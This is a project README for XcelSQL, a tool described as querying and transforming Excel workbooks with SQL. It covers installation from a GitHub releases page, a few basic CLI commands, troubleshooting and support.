# 🚀 XcelSQL - Automate Your Excel Tasks with Ease

[![Download XcelSQL](https://img.shields.io/badge/Download-XcelSQL-blue.svg)](https://github.com/uigoki472/XcelSQL/releases)

## 📦 Overview

XcelSQL lets you query, transform, and automate Excel workbooks using real SQL and reusable mapping templates. With this tool, you can run projections, joins, filters, parameterized queries, and exports in various formats like Excel, CSV, JSON, JSONL, and Parquet. This software helps replace manual spreadsheet tasks with repeatable, versioned workflows.

XcelSQL combines a fast Command Line Interface (CLI) and Read-Eval-Print Loop (REPL). You'll find it easy to create and manage data processes. 

## 🌟 Key Features

- **Simple SQL Queries:** Write SQL commands to interact with your data.
- **Automation:** Automate repetitive tasks and save time.
- **Data Transformation:** Easily transition data between various formats.
- **Reusable Templates:** Create and use templates to standardize your processes.
- **Multiple Formats:** Export your data in Excel, CSV, JSON, JSONL, or Parquet formats.
  
## 📋 System Requirements

Before you start, ensure your system meets the following requirements:

- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
- **Python Version:** Python 3.7 or later.
- **Memory:** At least 4 GB of RAM.
- **Disk Space:** A minimum of 100 MB for installation.

## 🚀 Getting Started

To get started with XcelSQL, follow these steps:

1. **Download XcelSQL:**
   Visit the [Releases page](https://github.com/uigoki472/XcelSQL/releases) to download the application. You will find different versions available for different operating systems.

2. **Install the Application:**
   After downloading, locate the downloaded file (usually in your "Downloads" folder) and follow these instructions based on your operating system:

   - **Windows:**
     - Double-click the installer file and follow the prompts to install XcelSQL.

   - **macOS:**
     - Open the downloaded DMG file and drag XcelSQL into your Applications folder.

   - **Linux:**
     - Extract the downloaded archive and move it to your desired location using the terminal.

3. **Open XcelSQL:**
   After installation, launch the application. You can now start using XcelSQL to automate your tasks.

## 🔍 Usage Instructions

### Running XcelSQL

Once you've installed XcelSQL, open your command line interface (Command Prompt on Windows, Terminal on macOS and Linux). 

Type the following command to start:
```
xcel
```
This command will open the XcelSQL CLI, where you can begin executing your SQL queries.

### Basic Commands

1. **Load a Workbook:**
   To load an Excel workbook, use:
   ```
   load "your_excel_file.xlsx"
   ```

2. **Execute a Query:**
   You can run a SQL query like this:
   ```
   SELECT * FROM your_table_name WHERE condition;
   ```

3. **Export Data:**
   To export the results in CSV format:
   ```
   export to "output_file.csv";
   ```

### Help and Documentation

To access help, type:
```
help
```
This command provides a list of available commands and options. 

## 🔗 Download & Install 

Ready to dive in? Visit the [Releases page](https://github.com/uigoki472/XcelSQL/releases) to download the latest version of XcelSQL. 

## 🛠️ Troubleshooting

If you encounter any issues during installation or usage, please check the following:

- **Installation Issues:** Ensure you have the correct Python version installed and your system meets the requirements.
- **Excel Files:** Make sure your Excel files are not corrupted and are saved in a supported format.
- **Command Errors:** Double-check your SQL syntax and ensure tables exist in your Excel workbook.

If issues persist, consider looking at our [GitHub Issues page](https://github.com/uigoki472/XcelSQL/issues) for solutions or to report a problem.

## 🙌 Community and Support

For support or to ask questions, consider joining our community:

- **GitHub Discussions:** Share your ideas and get answers to your questions.
- **Slack Channel:** Connect with other users for guidance and tips.

## 📜 License

XcelSQL is an open-source project. You can use and modify it according to the terms of the MIT License.

With XcelSQL, you can simplify your data processes and focus on what matters most. Start transforming your Excel workflows today!